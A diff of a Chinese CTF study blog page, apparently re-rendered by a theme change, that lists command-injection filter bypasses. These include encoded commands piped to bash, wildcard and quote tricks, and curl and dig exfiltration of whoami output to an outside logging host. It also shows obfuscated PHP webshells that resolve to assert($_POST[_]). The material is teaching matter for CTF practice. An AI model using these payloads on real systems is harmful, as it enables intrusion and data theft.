-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">IFS=&#x27;&amp;&#x27;<br>STRING2=&quot;111&amp;222&amp;&amp;333&amp;&amp;&amp;444&quot;<br>echo $STRING2   # 111 222  333   444     (没有双引号包裹，分隔符以空格显示)<br>echo &quot;$STRING2&quot;   # 111&amp;222&amp;&amp;333&amp;&amp;&amp;444<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IFS=&#x27;&amp;&#x27;</span><br><span class="line">STRING2=&quot;111&amp;222&amp;&amp;333&amp;&amp;&amp;444&quot;</span><br><span class="line">echo $STRING2   # 111 222  333   444     (没有双引号包裹，分隔符以空格显示)</span><br><span class="line">echo &quot;$STRING2&quot;   # 111&amp;222&amp;&amp;333&amp;&amp;&amp;444</span><br></pre></td></tr></table></figure></div>
 </blockquote>
 <blockquote>
 <p>$* 指的是脚本入口参数的字符串集，是一个全局变量</p>
@@ -363,54 +586,64 @@
 <p>那么 echo $* 输出的就是111 222 333</p>
 <p>而$*等于111IFS222IFS333IFS444 所以会根据IFS值改变结果</p>
 </blockquote>
-<h3 id="某些关键字被过滤"><a href="#某些关键字被过滤" class="headerlink" title="某些关键字被过滤"></a>某些关键字被过滤</h3><h4 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Y2F0IC9mbGFn&quot;</span>|base64 -d|bash     <span class="hljs-comment">//cat /flag</span><br></code></pre></td></tr></table></figure>
+<h3 id="某些关键字被过滤"><a href="#某些关键字被过滤" class="headerlink" title="某些关键字被过滤"></a>某些关键字被过滤</h3><h4 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|base64 -d|bash     <span class="comment">//cat /flag</span></span><br></pre></td></tr></table></figure></div>
 
-<h4 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">ph<span class="hljs-string">&quot;&quot;</span>p  =&gt;  php<br>ca<span class="hljs-string">&#x27;&#x27;</span>t  =&gt;  cat<br>ca``t  =&gt;  cat<br></code></pre></td></tr></table></figure>
+<h4 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ph<span class="string">&quot;&quot;</span>p  =&gt;  php</span><br><span class="line">ca<span class="string">&#x27;&#x27;</span>t  =&gt;  cat</span><br><span class="line">ca``t  =&gt;  cat</span><br></pre></td></tr></table></figure></div>
 
-<h4 id="偶读拼接绕过"><a href="#偶读拼接绕过" class="headerlink" title="偶读拼接绕过"></a>偶读拼接绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=<span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span>;a=l;b=s;$a<span class="hljs-variable">$b</span> <span class="hljs-comment">//ls</span><br></code></pre></td></tr></table></figure>
+<h4 id="偶读拼接绕过"><a href="#偶读拼接绕过" class="headerlink" title="偶读拼接绕过"></a>偶读拼接绕过</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">192.168</span>.<span class="number">0.1</span>;a=l;b=s;$a<span class="variable">$b</span> <span class="comment">//ls</span></span><br></pre></td></tr></table></figure></div>
 
-<h4 id="反斜杠-绕过"><a href="#反斜杠-绕过" class="headerlink" title="反斜杠 \ 绕过"></a>反斜杠 \ 绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">ca\t =&gt; cat<br>fl\ag =&gt; flag<br>ph\p =&gt; php<br></code></pre></td></tr></table></figure>
+<h4 id="反斜杠-绕过"><a href="#反斜杠-绕过" class="headerlink" title="反斜杠 \ 绕过"></a>反斜杠 \ 绕过</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ca\t =&gt; cat</span><br><span class="line">fl\ag =&gt; flag</span><br><span class="line">ph\p =&gt; php</span><br></pre></td></tr></table></figure></div>
 
-<h4 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h4><p>[<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a>]</p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/279563.html">[老生常谈的无字母数字 Webshell 总结 - FreeBuf网络安全行业门户]</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">shell下可以利用.来执行任意脚本<br>Linux文件名支持用glob通配符代替<br>/?url=<span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span>|cat%<span class="hljs-number">09</span>/fla?<br>/?url=<span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span>|cat%<span class="hljs-number">09</span>/fla*<br>假设flag在/flag中:<br>/?url=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>|ca<span class="hljs-string">&quot;&quot;</span>t%<span class="hljs-number">09</span>/fla?<br>/?url=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>|ca<span class="hljs-string">&quot;&quot;</span>t%<span class="hljs-number">09</span>/fla*<br>    <br>假设flag在/flag.txt中:<br>/?url=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>|ca<span class="hljs-string">&quot;&quot;</span>t%<span class="hljs-number">09</span>/fla????<br>/?url=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>|ca<span class="hljs-string">&quot;&quot;</span>t%<span class="hljs-number">09</span>/fla*<br>    <br>假设flag在/flags/flag.txt中:<br>/?url=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>|ca<span class="hljs-string">&quot;&quot;</span>t%<span class="hljs-number">09</span>/fla??/fla????<br>/?url=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>|ca<span class="hljs-string">&quot;&quot;</span>t%<span class="hljs-number">09</span>/fla*/fla*<br>  <br>/bin/ca? a*Hello!<br></code></pre></td></tr></table></figure>
+<h4 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h4><p>[<a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" >无字母数字webshell之提高篇 | 离别歌 (leavesongs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>]</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/279563.html" >[老生常谈的无字母数字 Webshell 总结 - FreeBuf网络安全行业门户] <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">shell下可以利用.来执行任意脚本</span><br><span class="line">Linux文件名支持用glob通配符代替</span><br><span class="line">/?url=<span class="number">192.168</span>.<span class="number">0.1</span>|cat%<span class="number">09</span>/fla?</span><br><span class="line">/?url=<span class="number">192.168</span>.<span class="number">0.1</span>|cat%<span class="number">09</span>/fla*</span><br><span class="line">假设flag在/flag中:</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla?</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla*</span><br><span class="line">    </span><br><span class="line">假设flag在/flag.txt中:</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla????</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla*</span><br><span class="line">    </span><br><span class="line">假设flag在/flags/flag.txt中:</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla??/fla????</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla*/fla*</span><br><span class="line">  </span><br><span class="line">/bin/ca? a*Hello!</span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
 <p>这里要注意，你使用的命令补全时会不会存在歧义，比如ca补全时，三个字母的有<code>cal</code>和<code>cat</code>两种</p>
 <p>cal的路径和cat的路径完全不一样，这也是这里为什么要指定路径的缘故</p>
-<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032329169.jpg" srcset="/img/loading.gif" lazyload alt="image-20220815032641305"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032329169.jpg"
+                      alt="image-20220815032641305"
+                ></p>
 </blockquote>
 <p><strong>Hex编码绕过</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;636174202f666c6167&quot;|xxd -r -p|bash     将执行cat /flag<br><span class="hljs-meta prompt_">$</span><span class="language-bash">(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>)         执行<span class="hljs-built_in">cat</span> /flag</span><br>&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|$0       执行cat /flag<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;636174202f666c6167&quot;|xxd -r -p|bash     将执行cat /flag</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">(<span class="built_in">printf</span> <span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>)         执行<span class="built_in">cat</span> /flag</span></span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|$0       执行cat /flag</span><br></pre></td></tr></table></figure></div>
 
 <p><strong>Oct编码绕过</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\154\163&quot;</span>)       执行<span class="hljs-built_in">ls</span></span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">(<span class="built_in">printf</span> <span class="string">&quot;\154\163&quot;</span>)       执行<span class="built_in">ls</span></span></span><br></pre></td></tr></table></figure></div>
 
 <p><strong>内联执行绕过</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;a`pwd`&quot;          #输出a/root<br>?ip=127.0.0.1;cat$IFS$9`ls`<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;a`pwd`&quot;          #输出a/root</span><br><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure></div>
 
 <p><strong>[]匹配绕过</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">c[a]t  =&gt;  cat<br>mo[r]e  =&gt;  more  <br>in[d]ex  =&gt;  index<br>p[h]p  =&gt;  php<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c[a]t  =&gt;  cat</span><br><span class="line">mo[r]e  =&gt;  more  </span><br><span class="line">in[d]ex  =&gt;  index</span><br><span class="line">p[h]p  =&gt;  php</span><br></pre></td></tr></table></figure></div>
 
-<h4 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">a=c;b=at;c=a;d=txt;$a$b $c.$da=c;b=at;c=a;d=txt;$a$b $&#123;c&#125;.$&#123;d&#125;  # cat a.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Hello!</span><br></code></pre></td></tr></table></figure>
+<h4 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=a;d=txt;$a$b $c.$da=c;b=at;c=a;d=txt;$a$b $&#123;c&#125;.$&#123;d&#125;  # cat a.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Hello!</span></span><br></pre></td></tr></table></figure></div>
 
-<h4 id="利用环境变量取值"><a href="#利用环境变量取值" class="headerlink" title="利用环境变量取值"></a><strong>利用环境变量取值</strong></h4><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032329605.jpg" srcset="/img/loading.gif" lazyload alt="image-20220815031943830"></p>
+<h4 id="利用环境变量取值"><a href="#利用环境变量取值" class="headerlink" title="利用环境变量取值"></a><strong>利用环境变量取值</strong></h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032329605.jpg"
+                      alt="image-20220815031943830"
+                ></p>
 <blockquote>
 <p>:3:1  下标为3的字符开始打印一个字符，总的也是一个字符，下标从0开始</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sh-3.2# echo $&#123;SHELLOPTS&#125;<br>braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor:posix<br>sh-3.2# echo $&#123;SHELLOPTS:1:10&#125;<br>raceexpand<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sh-3.2# echo $&#123;SHELLOPTS&#125;</span><br><span class="line">braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor:posix</span><br><span class="line">sh-3.2# echo $&#123;SHELLOPTS:1:10&#125;</span><br><span class="line">raceexpand</span><br></pre></td></tr></table></figure></div>
 </blockquote>
-<h4 id="使用空变量"><a href="#使用空变量" class="headerlink" title="使用空变量"></a><strong>使用空变量</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c<span class="hljs-variable">$&#123;z&#125;</span>at a.txt<br></code></pre></td></tr></table></figure>
+<h4 id="使用空变量"><a href="#使用空变量" class="headerlink" title="使用空变量"></a><strong>使用空变量</strong></h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c<span class="variable">$&#123;z&#125;</span>at a.txt</span><br></pre></td></tr></table></figure></div>
 
 <h4 id="无回显绕过"><a href="#无回显绕过" class="headerlink" title="无回显绕过"></a>无回显绕过</h4><p>外带信息，访问vps,然后去日志中查找</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl vps:port/`whoami`<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl vps:port/`whoami`</span><br></pre></td></tr></table></figure></div>
 
 <p>或者加上编码也可</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl 34kk35.ceye.io/$(<span class="hljs-built_in">whoami</span> | <span class="hljs-built_in">base64</span>)<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 34kk35.ceye.io/$(<span class="built_in">whoami</span> | <span class="built_in">base64</span>)</span><br></pre></td></tr></table></figure></div>
 
 <p><strong>使用DNS</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig `<span class="hljs-built_in">whoami</span>`.34kk35.ceye.io<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig `<span class="built_in">whoami</span>`.34kk35.ceye.io</span><br></pre></td></tr></table></figure></div>
 
-<h2 id="无数字字母shell"><a href="#无数字字母shell" class="headerlink" title="无数字字母shell"></a>无数字字母shell</h2><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="无数字字母shell"><a href="#无数字字母shell" class="headerlink" title="无数字字母shell"></a>无数字字母shell</h2><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
 <p>过滤了数字字母大小写，无法正常传一句话</p>
@@ -421,20 +654,30 @@
 <li>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</li>
 </ul>
 <h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%12&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>); <span class="hljs-comment">// $_=&#x27;assert&#x27;;</span><br><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>); <span class="hljs-comment">// $__=&#x27;_POST&#x27;;</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;<br><span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]); <span class="hljs-comment">// assert($_POST[_]);</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure></div>
 
 <h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用的是位运算里的“取反”，利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h5802luzjqj209y0bejrs.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<br><br><span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;的&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;半&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;始&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<br><br><span class="hljs-variable">$_____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;俯&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;次&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;站&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<br><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<br><span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]);<br></code></pre></td></tr></table></figure>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h5802luzjqj209y0bejrs.jpg"
+                      alt="img"
+                ></p>
